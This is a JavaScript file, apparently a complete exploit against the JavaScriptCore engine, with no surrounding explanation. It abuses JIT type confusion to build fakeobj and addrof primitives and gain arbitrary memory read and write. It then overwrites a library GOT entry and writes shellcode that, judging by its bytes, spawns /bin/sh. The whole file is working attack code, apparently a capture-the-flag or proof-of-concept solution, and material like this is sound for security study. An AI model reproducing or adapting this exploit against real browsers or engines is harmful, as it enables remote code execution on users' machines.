let abuf = new ArrayBuffer(0x10);
let bbuf = new BigUint64Array(abuf);
let fbuf = new Float64Array(abuf);
let __obj = { o: 0x1337, oo: 0x4141 };

let __a = { o: {} };
let __b = { o: 0x1337 };
function compare(__a, __b) {
    return __a.o === __b.o;
}
function jit_compare() {
    for (let i = 0; i < 0x10000; i++) {
        compare(__a, __b);
    }
}
jit_compare();

function deoptimize_compare() {
    let a = { x: 0x1337 };
    let b = { o: 0x1337 };
    for (let i = 0; i < 0x1000; i++) {
        try { compare(a, b); } catch (e) { }
    }
}

function fakeobj__(arg, a2) {
    for (let i in __obj) {
        __obj = [1];
        let out = arg[i];
        a2.o = out;
    }
    return a2.o;
}

function deoptimize_fakeobj__() {
    __obj = 0x414141;
    fakeobj__(0x414141, {});
}

__fake = { o: {} };
function jit_fakeobj() {
    __obj = { o: 1234, oo: 1234 };
    fakeobj__(__obj, __fake);
    for (let i = 0; i < 0x10000; i++) {
        fakeobj__(fbuf, __fake);
    }
}

jit_fakeobj();

buffer = new ArrayBuffer(8);
view = new DataView(buffer);
t = {};

function float2uint(value) {
    view.setFloat64(0, value);
    return view.getBigUint64(0);
}

function uint2float(value) {
    view.setBigUint64(0, value, true);
    return view.getFloat64(0, true);
}

function fakeobj(addr) {
    bbuf[0] = addr | 0xfffe000000000000n;
    let o = fakeobj__(fbuf, __fake);
    return o;
}

let arr_list = [];
p = 13.37;
for (let i = 0; i < 30; i++) {
    a = new Array(p, 1.1, 1.2, 1.3, 1.4, 1.5);
    arr_list.push(a);
}

obj_array = new Array({}, 1.1, 1.2, 1.3, 1.4, 1.5);
float_array = new Array(1.1, 1.2, 1.3, 1.4, 1.5);

let fake_cell = uint2float(0x0108240700006240n - 0x2000000000000n);
let container = {
    header: fake_cell,
    butterfly: arr_list[1],
    pad1: uint2float(0n),
    pad2: uint2float(0n)
};
let _addr = 0n;
let toLeak = { o: container };

function run_cmp(_fbuf, leak_target) {
    let m = null;
    for (let i in __obj) {
        __obj = [1];
        let out = _fbuf[i];
        m = out;
    }
    return compare(leak_target, { o: m });
}
function jit_run_cmp() {
    __obj = { o: 0x1337, oo: 0x4141 };
    run_cmp(__obj, toLeak);
    for (let i = 0; i < 0x10000; i++) {
        run_cmp(fbuf, toLeak);
    }
}
jit_run_cmp();
jit_compare();

function dirty_addrof() {
    let i = 0;
    for (i = 0x7f0000000130n; i < 0x7fffffff0130n; i += 0x10000n) {
        bbuf[0] = i | 0xfffe000000000000n;
        let r = run_cmp(fbuf, toLeak);
        if (r) {
            return i;
        }
    }
    throw ("[!] not found: " + i.toString(16));
}

function hex(x) {
    return "0x" + x.toString(16);
}

fake_arr_addr = dirty_addrof() + 0x10n;
fake_arr = fakeobj(fake_arr_addr);
container.header = uint2float(float2uint(fake_arr[0]) - 0x2000000000000n);

function arb_readn(addr, o) {
    fake_arr[1] = uint2float(addr);
    return arr_list[1][o];
}

function arb_write_uintn(addr, value, offset) {
    fake_arr[1] = uint2float(addr);
    arr_list[1][offset] = uint2float(value);
}

function arb_write_float(addr, value) {
    fake_arr[1] = uint2float(addr);
    arr_list[1][0] = (value);
}

arb_write_uintn(fake_arr_addr + 0x100n, 0x4141414141414141n, 0);

function wasm_func() {
    var wasm_import = {
        env: {}
    };
    var buffer = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1, 127, 3, 130, 128, 128, 128, 0, 1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131, 128, 128, 128, 0, 1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145, 128, 128, 128, 0, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 109, 97, 105, 110, 0, 0, 10, 138, 128, 128, 128, 0, 1, 132, 128, 128, 128, 0, 0, 65, 42, 11]);
    let m = new WebAssembly.Instance(new WebAssembly.Module(buffer), wasm_import);
    let h = new Uint8Array(m.exports.memory.buffer);
    return m.exports.main;
}

function addrof(any_obj) {
    arr_list[2][0] = any_obj;
    fake_arr[2] = uint2float(0x0008240700006240n);
    r = float2uint(arr_list[2][0]);
    fake_arr[2] = uint2float(0x01082409000061d0n);
    return r;
}

wasm_function = wasm_func();
wasm_function_addr = addrof(wasm_function);
code_addr = wasm_function_addr + 0x40n - 0x10n;
code_addr = float2uint(arb_readn(code_addr, 2));
target_code_addr = code_addr - 0x4000n + 0x20n;

var shellcode = [
0x6e69622fb848686an,
0xe7894850732f2f2fn,
0x2434810101697268n,
0x6a56f63101010101n,
0x894856e601485e08n,
0x050f583b6ad231e6n
];

function get_jit_function() {
    function target(num) {
        for (var i = 2; i < num; i++) {
            if (num % i === 0) {
                return false;
            }
        }
        return true;
    }
    for (var i = 0; i < 0x5000; i++) {
        target(i);
    }
    for (var i = 0; i < 0x5000; i++) {
        target(i);
    }
    for (var i = 0; i < 0x5000; i++) {
        target(i);
    }

    return target;
}

let f = get_jit_function();
let addr_f = addrof(f);
let addr_wtf = float2uint(arb_readn(addr_f, 3));
let addr_wtf2 = float2uint(arb_readn(addr_wtf + 8n, 0));
container.header = uint2float(float2uint(fake_arr[0]) - 0x2000000000000n);
let addr_wtf3 = float2uint(arb_readn(addr_wtf2-0x10n, 0x2));
container.header = uint2float(float2uint(fake_arr[0]) - 0x2000000000000n);
let addr_wtf4 = float2uint(arb_readn(addr_wtf3-0x10n, 2));

let libjsc = addr_wtf4 - 0x7effb0n;
let exit_got = libjsc + 0x1e96380n;
arb_write_uintn(exit_got, target_code_addr, 0);
for (let i = 0; i < shellcode.length; i++) {
    arb_write_uintn(target_code_addr, BigInt(shellcode[i]), i);
}

Math.sin(1);















